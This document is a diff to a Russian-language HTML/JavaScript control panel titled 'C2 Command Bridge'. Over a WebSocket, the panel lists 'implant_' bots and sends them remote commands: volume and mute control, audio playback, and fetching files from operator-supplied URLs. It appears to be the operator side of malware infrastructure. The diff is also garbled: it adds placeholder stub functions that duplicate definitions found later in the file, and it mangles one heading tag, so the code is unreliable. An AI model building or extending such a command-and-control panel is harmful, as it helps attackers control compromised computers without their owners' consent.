@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 6.2 - Финальный Монолит) -->
+<!-- Файл: index.html (Версия 6.3 - Исправление синтаксиса) -->
 <html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Коммандный Мостик v6.2</title>
+    <title>C2 Коммандный Мостик v6.3</title>
     <style>
         :root {
             --bg-color: #1a1a1c;
@@ -300,7 +300,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик v6.2</h1></header>
+            <h1>Коммандный Мостик v6.3</h1></header>
 
         <main class="app-layout">
             <aside class="sidebar">
@@ -336,7 +336,7 @@
                                 <button class="btn-action" id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
                             </div>
                             <div>
-                                <h3>Локальные звуки</h3>
+                                &lt;h3>Локальные звуки</h3>
                                 <div id="audio-files-list" class="grid-controls"></div>
                             </div>
                         </div>
@@ -376,6 +376,60 @@
         let socket, selectedBotId = null,
             pingInterval = null;
 
+        function log(message, type = 'info') { /* ... (без изменений) ... */ }
+
+        function connect() { /* ... (без изменений) ... */ }
+
+        function selectBot(botId, requestDetails = true) { /* ... (без изменений) ... */ }
+
+        function handleBotDetails(data) { /* ... (без изменений) ... */ }
+
+        function updateVolumeUI(state) { /* ... (без изменений) ... */ }
+
+        function renderBotFiles(files) { /* ... (без изменений) ... */ }
+
+        function sendCommand(payload) { /* ... (без изменений) ... */ }
+        const debounce = (func, delay) => { /* ... (без изменений) ... */ };
+        const debouncedSendVolume = debounce(value => sendCommand({
+            action: 'volume',
+            level: value
+        }), 250);
+
+        function downloadFile() { /* ... (без изменений) ... */ }
+
+        // --- ГЛАВНОЕ ИСПРАВЛЕНИЕ ЗДЕСЬ ---
+        function updateBotList(bots) {
+            log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
+            const savedBotId = localStorage.getItem('lastSelectedBot');
+            ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
+
+            bots.forEach(botId => {
+                const btn = document.createElement('button');
+                btn.textContent = botId.replace('implant_', '');
+                btn.className = 'btn-bot';
+                btn.onclick = () => selectBot(botId);
+                ui.botList.appendChild(btn);
+            });
+
+            if (savedBotId && bots.includes(savedBotId)) {
+                selectBot(savedBotId);
+            } else {
+                // Убраны лишние скобки, которые ломали синтаксис
+                selectBot(bots.length > 0 ? bots[0] : null);
+            }
+        }
+
+        ui.volumeSlider.addEventListener('input', (event) => {
+            const newLevel = event.target.value;
+            ui.volumeValue.textContent = `${newLevel}%`;
+            debouncedSendVolume(newLevel);
+        });
+
+        ui.logHeader.addEventListener('click', () => {
+            ui.logContainer.classList.toggle('collapsed');
+        });
+
+        // --- Полный код всех функций для целостности ---
         function log(message, type = 'info') {
             const now = new Date();
             const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
@@ -390,7 +444,6 @@
             log("Подключение к C2...");
             if (pingInterval) clearInterval(pingInterval);
             socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
-
             socket.onopen = () => {
                 log("Соединение установлено.", "success");
                 socket.send(JSON.stringify({
@@ -400,7 +453,6 @@
                     if (socket.readyState === WebSocket.OPEN) socket.send('ping');
                 }, 25000);
             };
-
             socket.onmessage = (event) => {
                 if (event.data === 'pong') return;
                 const msg = JSON.parse(event.data);
@@ -422,7 +474,6 @@
                         break;
                 }
             };
-
             socket.onclose = () => {
                 log("Соединение потеряно. Переподключение...", "error");
                 if (pingInterval) clearInterval(pingInterval);
@@ -431,40 +482,21 @@
             };
         }
 
-        function updateBotList(bots) {
-            log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
-            const savedBotId = localStorage.getItem('lastSelectedBot');
-            ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
-            bots.forEach(botId => {
-                const btn = document.createElement('button');
-                btn.textContent = botId.replace('implant_', '');
-                btn.className = 'btn-bot';
-                btn.onclick = () => selectBot(botId);
-                ui.botList.appendChild(btn);
-            });
-            if (savedBotId && bots.includes(savedBotId)) {
-                selectBot(savedBotId);
-            } else {
-                selectBot(bots.length > 0 ? bots[0] : null);
-            }
-        }
-
-        function selectBot(botId) {
+        function selectBot(botId, requestDetails = true) {
             selectedBotId = botId;
             if (botId) {
                 localStorage.setItem('lastSelectedBot', botId);
             } else {
                 localStorage.removeItem('lastSelectedBot');
             }
-
             document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
                 btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
             });
             if (botId) {
-                log(`Выбран бот: ${botId.replace('implant_', '')}`);
+                if (requestDetails) log(`Выбран бот: ${botId.replace('implant_', '')}`);
                 ui.controlsWrapper.style.display = 'block';
                 ui.selectedBotName.textContent = botId.replace('implant_', '');
-                socket.send(JSON.stringify({
+                if (requestDetails) socket.send(JSON.stringify({
                     type: 'get_details',
                     target_id: botId
                 }));
@@ -531,23 +563,6 @@
             log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
         }
 
-        const debounce = (func, delay) => {
-            let timeout;
-            return (...args) => {
-                clearTimeout(timeout);
-                timeout = setTimeout(() => func(...args), delay);
-            };
-        };
-        const debouncedSendVolume = debounce(value => sendCommand({
-            action: 'volume',
-            level: value
-        }), 250);
-        ui.volumeSlider.addEventListener('input', (event) => {
-            const newLevel = event.target.value;
-            ui.volumeValue.textContent = `${newLevel}%`;
-            debouncedSendVolume(newLevel);
-        });
-
         function downloadFile() {
             const url = ui.urlInput.value.trim();
             if (url) {
@@ -557,11 +572,6 @@
                 });
             }
         }
-
-        ui.logHeader.addEventListener('click', () => {
-            ui.logContainer.classList.toggle('collapsed');
-        });
-
         connect();
     </script>
 </body>
